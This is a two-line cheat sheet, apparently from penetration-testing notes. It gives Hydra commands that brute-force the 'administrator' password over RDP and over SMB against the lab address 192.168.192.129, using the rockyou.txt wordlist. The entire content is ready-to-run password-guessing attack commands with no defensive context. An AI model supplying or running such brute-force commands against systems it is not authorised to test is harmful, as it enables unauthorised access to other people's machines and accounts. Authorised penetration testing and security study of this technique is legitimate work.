# Hydra remote desktop(RDP) Brute force attack.
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.192.129 -t 4 -V

#Hydra smb brute force attack.
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.192.129 -t 4 -V
